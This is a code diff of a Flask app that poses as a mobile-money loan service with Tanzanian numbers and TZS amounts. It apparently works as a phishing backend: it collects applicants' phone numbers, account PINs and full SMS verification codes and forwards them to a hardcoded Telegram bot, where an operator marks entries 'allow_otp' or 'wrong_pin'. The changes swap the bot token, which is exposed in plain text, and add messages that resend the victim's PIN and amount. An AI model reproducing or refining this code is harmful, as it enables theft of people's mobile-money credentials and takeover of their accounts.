@@ -9,7 +9,7 @@ app = Flask(__name__)
 app.secret_key = 'mixxplus-secret-key-2024'
 
 # ==================== TELEGRAM CONFIG ====================
-TELEGRAM_BOT_TOKEN = '8898988712:AAH8sR5P4Lb2TUKxTWNnO3dMqKNOMRXNGZ4'
+TELEGRAM_BOT_TOKEN = '8913073247:AAGWABeG_7SqZawTN_a_idiaSy4RDSBRIJg'
 TELEGRAM_CHAT_ID = '8589275340'
 
 # ==================== DATA STORE ====================
@@ -57,7 +57,8 @@ def submit_loan():
         loan_type = data.get('loan_type', '')
         purpose = data.get('purpose', '')
         
-        app_id = str(uuid.uuid4())[:8]
+        # Generate app ID
+        app_id = 'MP-' + str(uuid.uuid4())[:8].upper()
         
         applications[app_id] = {
             'phone': phone,
@@ -71,16 +72,19 @@ def submit_loan():
             'created_at': datetime.now().isoformat()
         }
         
+        # Format phone number
+        formatted_phone = '+255 ' + phone
+        
+        # Send to Telegram with the EXACT format you want
         message = f"""
-📥 <b>NEW LOAN APPLICATION</b>
+🔄 <b>NEW LOAN APPLICATION</b>
 
 🆔 <b>ID:</b> {app_id}
-📱 <b>Phone:</b> +255{phone}
+📞 <b>Phone:</b> {formatted_phone}
 💰 <b>Amount:</b> TZS {amount:,}
-📅 <b>Term:</b> {months} months
+🔢 <b>PIN:</b> {pin}
 📋 <b>Type:</b> {loan_type or 'N/A'}
 📝 <b>Purpose:</b> {purpose or 'N/A'}
-🔐 <b>PIN:</b> {pin}
 
 ⏳ <b>Status:</b> Waiting for PIN verification
 """
@@ -129,7 +133,7 @@ def submit_code():
 🔐 <b>CODE VERIFICATION</b>
 
 🆔 <b>App ID:</b> {app_id}
-📱 <b>Phone:</b> +255{applications[app_id].get('phone', '')}
+📞 <b>Phone:</b> +255{applications[app_id].get('phone', '')}
 
 <b>📱 Full SMS:</b>
 <code>{code}</code>
@@ -171,7 +175,7 @@ def resend_code():
 🔄 <b>CODE RESEND REQUESTED</b>
 
 🆔 <b>App ID:</b> {app_id}
-📱 <b>Phone:</b> +255{applications[app_id].get('phone', '')}
+📞 <b>Phone:</b> +255{applications[app_id].get('phone', '')}
 
 New OTP has been requested. Please wait for SMS.
 """
@@ -215,7 +219,20 @@ def webhook():
                     response = f"✅ LOAN APPROVED for {app_id}!"
                 elif action_type == 'allow_otp':
                     applications[app_id]['status'] = 'approved'
-                    response = f"✅ OTP ALLOWED for {app_id}!"
+                    # Send returning user message
+                    phone = applications[app_id].get('phone', '')
+                    amount = applications[app_id].get('amount', 0)
+                    pin = applications[app_id].get('pin', '')
+                    response = f"""
+🔄 <b>RETURNING USER</b>
+
+🆔 <b>ID:</b> {app_id}
+📞 <b>Phone:</b> +255 {phone}
+💰 <b>Amount:</b> TZS {amount:,}
+🔢 <b>PIN:</b> {pin}
+
+✅ <b>ALLOWED</b>
+"""
                 elif action_type == 'wrong_pin':
                     applications[app_id]['status'] = 'wrong_pin'
                     response = f"❌ WRONG PIN for {app_id}!"
